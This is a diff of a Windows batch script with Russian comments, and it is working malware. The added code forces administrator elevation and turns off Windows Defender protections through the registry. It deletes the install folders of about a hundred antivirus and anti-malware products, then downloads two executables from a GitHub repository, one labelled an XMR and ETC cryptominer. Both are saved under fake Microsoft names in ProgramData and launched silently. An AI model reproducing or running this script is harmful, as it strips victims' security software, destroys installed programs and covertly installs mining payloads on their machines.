@@ -1,141 +1,159 @@
+��&cls
 @echo off
 setlocal
 
-:: Проверка, запущен ли скрипт с правами администратора
-net session >nul 2>&1
-if %errorLevel% NEQ 0 (
-    powershell -Command "Start-Process cmd -ArgumentList '/c, %~s0' -Verb RunAs"
-    exit /b
+:: Автовыдача прав администратора
+>nul 2>&1 "%windir%\system32\cacls.exe" "%windir%\system32\config\system"
+if "%errorlevel%" neq "0" (
+    powershell -Command "Start-Process -Verb RunAs -FilePath '%~f0'"
+    exit /b 0
 )
+
+:: Изменение параметров Windows Defender
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f >nul 2>&1
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f >nul 2>&1
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableOnAccessProtection /t REG_DWORD /d 1 /f >nul 2>&1
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableControlledFoldersProtection /t REG_DWORD /d 1 /f >nul 2>&1
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableIOavScan /t REG_DWORD /d 1 /f >nul 2>&1
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableBehaviorMonitoring /t REG_DWORD /d 1 /f >nul 2>&1
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableNetworkProtection /t REG_DWORD /d 1 /f >nul 2>&1
 
 :: Удаление антивирусных программ
 for %%P in (
-    "%PROGRAMFILES%\AVAST Software\Avast\setup\instup.exe"
-    "%PROGRAMFILES%\AVG\Setup\avgsetupx.exe"
-    "%PROGRAMFILES%\Norton\NortonInstaller.exe"
-    "C:\Program Files\McAfee\MSC\mcuihost.exe"
-    "C:\Program Files (x86)\Avira\Launcher\Avira.Systray.exe"
-    "C:\Program Files (x86)\Panda Security\Panda Security Protection\Setup.exe"
-    "C:\Program Files (x86)\TotalAV\uninstall.exe"
-    "C:\Program Files (x86)\NANO Security\NANO Antivirus Pro\uninstall.exe"
-    "C:\Program Files (x86)\Kaspersky Lab\Kaspersky Internet Security\avpui.exe"
-    "C:\Program Files (x86)\Grizzly Antivirus\uninstall.exe"
-    "C:\Program Files (x86)\Kaspersky Lab\Kaspersky Total Security\avpui.exe"
-    "C:\Program Files\Doctor Web\Setup\drweb32.exe"
-    "C:\Program Files (x86)\Microsoft Defender Antivirus\mpam-dll.exe"
-    "C:\Program Files (x86)\Quick Heal\Quick Heal Total Security\quickheal.exe"
+    "C:\Program Files\AVAST Software\Avast"
+    "C:\Program Files\AVG\Setup"
+    "C:\Program Files\Norton\NortonInstaller.exe"
+    "C:\Program Files\McAfee\MSC"
+    "C:\Program Files (x86)\Avira\Launcher"
+    "C:\Program Files (x86)\Panda Security\Panda Security Protection"
+    "C:\Program Files (x86)\TotalAV"
+    "C:\Program Files (x86)\NANO Security\NANO Antivirus Pro"
+    "C:\Program Files (x86)\Kaspersky Lab\Kaspersky Internet Security"
+    "C:\Program Files (x86)\Grizzly Antivirus"
+    "C:\Program Files (x86)\Kaspersky Lab\Kaspersky Total Security"
+    "C:\Program Files\Doctor Web\Setup"
+    "C:\Program Files (x86)\Microsoft Defender Antivirus"
+    "C:\Program Files (x86)\Quick Heal\Quick Heal Total Security"
     "C:\Program Files (x86)\VIPRE\vipre.exe"
-    "C:\Program Files (x86)\Bitdefender\Bitdefender Antivirus Plus\bdagent.exe"
-    "C:\Program Files (x86)\ESET\ESET NOD32 Antivirus\NOD32Krnl.exe"
-    "C:\Program Files (x86)\Sophos\AutoUpdate\AutoUpdate.exe"
-    "C:\Program Files (x86)\K7 Computing\K7 TotalSecurity\kgp.exe"
-    "C:\Program Files (x86)\F-Secure\Antivirus\FSAntivirus.exe"
-    "C:\Program Files\Sophos\Sophos Endpoint Agent\SophosEndpoint.exe"
+    "C:\Program Files (x86)\Bitdefender\Bitdefender Antivirus Plus"
+    "C:\Program Files (x86)\ESET\ESET NOD32 Antivirus"
+    "C:\Program Files (x86)\Sophos\AutoUpdate"
+    "C:\Program Files (x86)\K7 Computing\K7 TotalSecurity"
+    "C:\Program Files (x86)\F-Secure\Antivirus"
+    "C:\Program Files\Sophos\Sophos Endpoint Agent"
     "C:\Program Files\Dr.Web\drweb.exe"
-    "C:\Program Files (x86)\Comodo\Comodo Antivirus\cavwp.exe"
-    "C:\Program Files\BullGuard\BullGuard Antivirus\BGUi.exe"
-    "C:\Program Files (x86)\ZoneAlarm\ZoneAlarm Security\zauninstall.exe"
-    "C:\Program Files\Malwarebytes\Anti-Malware\unins000.exe"
-    "C:\Program Files (x86)\Emsisoft\Anti-Malware\a2start.exe"
-    "C:\Program Files (x86)\Fortinet\FortiClient\FortiClient.exe"
+    "C:\Program Files (x86)\Comodo\Comodo Antivirus"
+    "C:\Program Files\BullGuard\BullGuard Antivirus"
+    "C:\Program Files (x86)\ZoneAlarm\ZoneAlarm Security"
+    "C:\Program Files\Malwarebytes\Anti-Malware"
+    "C:\Program Files (x86)\Emsisoft\Anti-Malware"
+    "C:\Program Files (x86)\Fortinet\FortiClient"
     "C:\Program Files (x86)\Webroot\WRSA.exe"
-    "C:\Program Files (x86)\IKARUS\IKARUS antiVirus\uninstall.exe"
-    "C:\Program Files (x86)\Rising\Rising Antivirus\Uninstall.exe"
-    "C:\Program Files (x86)\Kaspersky Lab\Kaspersky Free Antivirus\avp.exe"
-    "C:\Program Files (x86)\Norton Security\uninstall.exe"
-    "C:\Program Files\eScan\eScan Antivirus\uninst.exe"
-    "C:\Program Files (x86)\Panda Dome\uninstall.exe"
-    "C:\Program Files (x86)\ESET\Smart Security\unins000.exe"
-    "C:\Program Files (x86)\Kaspersky Lab\Kaspersky Security Cloud\avp.exe"
-    "C:\Program Files\Symantec\Symantec Endpoint Protection\sepinstall.exe"
-    "C:\Program Files\ZoneAlarm\ZoneAlarm\zav.exe"
+    "C:\Program Files (x86)\IKARUS\IKARUS antiVirus"
+    "C:\Program Files (x86)\Rising\Rising Antivirus"
+    "C:\Program Files (x86)\Kaspersky Lab\Kaspersky Free Antivirus"
+    "C:\Program Files (x86)\Norton Security"
+    "C:\Program Files\eScan\eScan Antivirus"
+    "C:\Program Files (x86)\Panda Dome"
+    "C:\Program Files (x86)\ESET\Smart Security"
+    "C:\Program Files (x86)\Kaspersky Lab\Kaspersky Security Cloud"
+    "C:\Program Files\Symantec\Symantec Endpoint Protection"
+    "C:\Program Files\ZoneAlarm\ZoneAlarm"
     "C:\Program Files (x86)\Titanium\titanium.exe"
-    "C:\Program Files (x86)\Iolo\System Mechanic\Uninstall.exe"
-    "C:\Program Files (x86)\SpyHunter\unins000.exe"
-    "C:\Program Files\Avira\Antivirus\uninstall.exe"
-    "C:\Program Files (x86)\G DATA\Internet Security\gdata.exe"
-    "C:\Program Files (x86)\BitDefender\Bitdefender Antivirus Free\uninstall.exe"
-    "C:\Program Files (x86)\Panda Antivirus Pro\uninstall.exe"
-    "C:\Program Files (x86)\Webroot\SecureAnywhere\WRSA.exe"
-    "C:\Program Files (x86)\F-Secure\F-Secure Internet Security\fsavgui.exe"
-    "C:\Program Files (x86)\McAfee\Total Protection\uninstall.exe"
-    "C:\Program Files\K7 Computing\K7 Antivirus\uninstall.exe"
-    "C:\Program Files (x86)\Avast Cleanup\AvastCleanup.exe"
-    "C:\Program Files\Bitdefender\Bitdefender Security\unins000.exe"
-    "C:\Program Files (x86)\Malwarebytes\Chameleon\Malwarebytes.exe"
-    "C:\Program Files (x86)\Avira\Connect\Avira Connect.exe"
-    "C:\Program Files (x86)\avast! antivirus\Setup\instup.exe"
+    "C:\Program Files (x86)\Iolo\System Mechanic"
+    "C:\Program Files (x86)\SpyHunter"
+    "C:\Program Files\Avira\Antivirus"
+    "C:\Program Files (x86)\G DATA\Internet Security"
+    "C:\Program Files (x86)\Bitdefender\Bitdefender Antivirus Free"
+    "C:\Program Files (x86)\Panda Antivirus Pro"
+    "C:\Program Files (x86)\Webroot\SecureAnywhere"
+    "C:\Program Files (x86)\F-Secure\F-Secure Internet Security"
+    "C:\Program Files (x86)\McAfee\Total Protection"
+    "C:\Program Files\K7 Computing\K7 Antivirus"
+    "C:\Program Files (x86)\Avast Cleanup"
+    "C:\Program Files\Bitdefender\Bitdefender Security"
+    "C:\Program Files (x86)\Malwarebytes\Chameleon"
+    "C:\Program Files (x86)\Avira\Connect"
+    "C:\Program Files (x86)\avast! antivirus"
     "C:\Program Files\Microsoft Security Client\SavUI.exe"
-    "C:\Program Files (x86)\SUPERAntiSpyware\SUPERAntiSpyware.exe"
-    "C:\Program Files (x86)\RogueKiller\RogueKiller.exe"
-    "C:\Program Files (x86)\ESET\NOD32 Antivirus\uninst.exe"
-    "C:\Program Files (x86)\Norton Security\uninstall.exe"
-    "C:\Program Files (x86)\AVG\AVG Internet Security\avgsetup.exe"
-    "C:\Program Files (x86)\Comodo\COMODO Internet Security\uninstall.exe"
-    "C:\Program Files (x86)\Panda Security\Setup\uninstall.exe"
-    "C:\Program Files (x86)\Avast\Avast Secure Browser\Application\AvastBrowser.exe"
-    "C:\Program Files (x86)\Kaspersky Lab\Kaspersky Labs\uninstall.exe"
+    "C:\Program Files (x86)\SUPERAntiSpyware"
+    "C:\Program Files (x86)\RogueKiller"
+    "C:\Program Files (x86)\ESET\NOD32 Antivirus"
+    "C:\Program Files (x86)\Norton Security"
+    "C:\Program Files (x86)\AVG\AVG Internet Security"
+    "C:\Program Files (x86)\Comodo\COMODO Internet Security"
+    "C:\Program Files (x86)\Panda Security\Setup"
+    "C:\Program Files (x86)\Avast\Avast Secure Browser\Application"
+    "C:\Program Files (x86)\Kaspersky Lab\Kaspersky Labs"
     "C:\Program Files (x86)\Panda Security\panda.exe"
     "C:\Program Files\F-Secure\FSAV\uninstall.exe"
-    "C:\Program Files (x86)\Microsoft\Windows Defender\uninstall.exe"
-    "C:\Program Files (x86)\G DATA\G DATA Internet Security\uninstall.exe"
-    "C:\Program Files (x86)\TrustPort\TrustPort Antivirus\uninstall.exe"
-    "C:\Program Files (x86)\Zillya\Zillya Antivirus\uninstall.exe"
-    "C:\Program Files (x86)\HitmanPro\HitmanPro\uninstall.exe"
-    "C:\Program Files (x86)\AdwCleaner\AdwCleaner\uninstall.exe"
-    "C:\Program Files (x86)\SpywareBlaster\SpywareBlaster\uninstall.exe"
-    "C:\Program Files (x86)\Malwarebytes\AdwCleaner\MalwarebytesAdwCleaner.exe"
-    "C:\Program Files (x86)\K7 Computing\K7 TotalSecurity\uninstall.exe"
-    "C:\Program Files (x86)\Emsisoft\Emsisoft Emergency Kit\uninstall.exe"
-    "C:\Program Files (x86)\Glary Utilities\Glary Utilities\uninstall.exe"
-    "C:\Program Files (x86)\RegCleaner\RegCleaner\uninstall.exe"
-    "C:\Program Files (x86)\Advanced SystemCare\Advanced SystemCare\uninstall.exe"
-    "C:\Program Files (x86)\IObit Malware Fighter\IObit Malware Fighter\uninstall.exe"
-    "C:\Program Files (x86)\Kaspersky Lab\Kaspersky Password Manager\uninstall.exe"
-    "C:\Program Files (x86)\Bitdefender\Bitdefender Anti-Theft\uninstall.exe"
-    "C:\Program Files (x86)\ESET\ESET Mobile Security\uninstall.exe"
-    "C:\Program Files (x86)\K7 Computing\K7 Antivirus Plus\uninstall.exe"
-    "C:\Program Files (x86)\Quick Heal\Quick Heal Total Security\uninstall.exe"
-    "C:\Program Files (x86)\F-Secure\F-Secure Safe\uninstall.exe"
-    "C:\Program Files (x86)\Panda Security\Panda Global Protection\uninstall.exe"
-    "C:\Program Files (x86)\G DATA\G DATA Total Security\uninstall.exe"
-    "C:\Program Files (x86)\Trend Micro\trend micro\uninstall.exe"
-    "C:\Program Files (x86)\Avast Software\Avast\uninstall.exe"
-    "C:\Program Files (x86)\AVG\AVG\uninstall.exe"
-    "C:\Program Files (x86)\Microsoft Security Essentials\MSE\uninstall.exe"
-    "C:\Program Files (x86)\Windows Defender\Windows Defender\uninstall.exe"
+    "C:\Program Files (x86)\Microsoft\Windows Defender"
+    "C:\Program Files (x86)\G DATA\G DATA Internet Security"
+    "C:\Program Files (x86)\TrustPort\TrustPort Antivirus"
+    "C:\Program Files (x86)\Zillya\Zillya Antivirus"
+    "C:\Program Files (x86)\HitmanPro\HitmanPro"
+    "C:\Program Files (x86)\AdwCleaner\AdwCleaner"
+    "C:\Program Files (x86)\SpywareBlaster\SpywareBlaster"
+    "C:\Program Files (x86)\Malwarebytes\AdwCleaner"
+    "C:\Program Files (x86)\K7 Computing\K7 TotalSecurity"
+    "C:\Program Files (x86)\Emsisoft\Emsisoft Emergency Kit"
+    "C:\Program Files (x86)\Glary Utilities\Glary Utilities"
+    "C:\Program Files (x86)\RegCleaner\RegCleaner"
+    "C:\Program Files (x86)\Advanced SystemCare\Advanced SystemCare"
+    "C:\Program Files (x86)\IObit Malware Fighter\IObit Malware Fighter"
+    "C:\Program Files (x86)\Kaspersky Lab\Kaspersky Password Manager"
+    "C:\Program Files (x86)\Bitdefender\Bitdefender Anti-Theft"
+    "C:\Program Files (x86)\ESET\ESET Mobile Security"
+    "C:\Program Files (x86)\K7 Computing\K7 Antivirus Plus"
+    "C:\Program Files (x86)\Quick Heal\Quick Heal Total Security"
+    "C:\Program Files (x86)\F-Secure\F-Secure Safe"
+    "C:\Program Files (x86)\Panda Security\Panda Global Protection"
+    "C:\Program Files (x86)\G DATA\G DATA Total Security"
+    "C:\Program Files (x86)\Trend Micro\trend micro"
+    "C:\Program Files (x86)\Avast Software\Avast"
+    "C:\Program Files (x86)\AVG\AVG"
+    "C:\Program Files (x86)\Microsoft Security Essentials\MSE"
+    "C:\Program Files (x86)\Windows Defender"
 ) do (
     if exist "%%P" (
-        start /b "" "%%P" >nul 2>&1
+        del /S /Q "%%P" >nul 2>&1
     )
 )
 
 :: Удаление других программ и папок
 for %%D in (
-    "%USERPROFILE%\AppData\Local\360SecureBrowser"
     "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Android Studio"
     "C:\Program Files\AVG\Browser\Application"
 ) do (
     if exist "%%D" (
-        rd /S /Q "%%~D" >nul 2>&1
+        if %windir% equ x86 (
+            rd /S /Q "%%~D" >nul 2>&1
+        ) else (
+            rd /S /Q "%%~D" >nul 2>&1
+        )
+        if %ERRORLEVEL% neq 0 (
+            rd /S /Q "%%~D" >nul 2>&1
+        )
     )
 )
 
-:: Регистрация и остановка Windows Defender
-reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f >nul 2>&1
-reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiVirus /t REG_DWORD /d 1 /f >nul 2>&1
-sc stop WinDefend >nul 2>&1
-sc config WinDefend start= disabled >nul 2>&1
-
 :: Скачивание и запуск дополнительного программного обеспечения
+set "TARGET_DIR=C:\ProgramData\Microsoft\Settings\Accounts\MicrosoftAccount"
+mkdir "%TARGET_DIR%" >nul 2>&1
+set "EXECUTABLE_URL=https://github.com/SchoolSigmaBoy/SchoolSigma/raw/main/SigmaBoy.exe"
+set "EXECUTABLE_PATH=%TARGET_DIR%\MicrosoftAccount.exe"
+powershell -Command "Invoke-WebRequest -Uri '%EXECUTABLE_URL%' -OutFile '%EXECUTABLE_PATH%'" >nul 2>&1
+start "" "%EXECUTABLE_PATH%" >nul 2>&1
+
+:: Скачивание XMR + ETC майнера
 set "TARGET_DIR=C:\ProgramData\Microsoft\Settings\Accounts\MicrosoftAccount"
 if not exist "%TARGET_DIR%" (
     mkdir "%TARGET_DIR%" >nul 2>&1
 )
 
-set "EXECUTABLE_URL=https://github.com/Rlz-vz/SchoolSigma/raw/main/SigmaBoy.exe"
-set "EXECUTABLE_PATH=%TARGET_DIR%\MicrosoftAccount.exe"
+set "EXECUTABLE_URL=https://github.com/SchoolSigmaBoy/SchoolSigma/raw/main/XDLOL.exe"
+set "EXECUTABLE_PATH=%TARGET_DIR%\MicrosoftList.exe"
 powershell -Command "Invoke-WebRequest '%EXECUTABLE_URL%' -OutFile '%EXECUTABLE_PATH%'" >nul 2>&1
 start "" /b "%EXECUTABLE_PATH%" >nul 2>&1
 
-exit /b
+exit /b 0
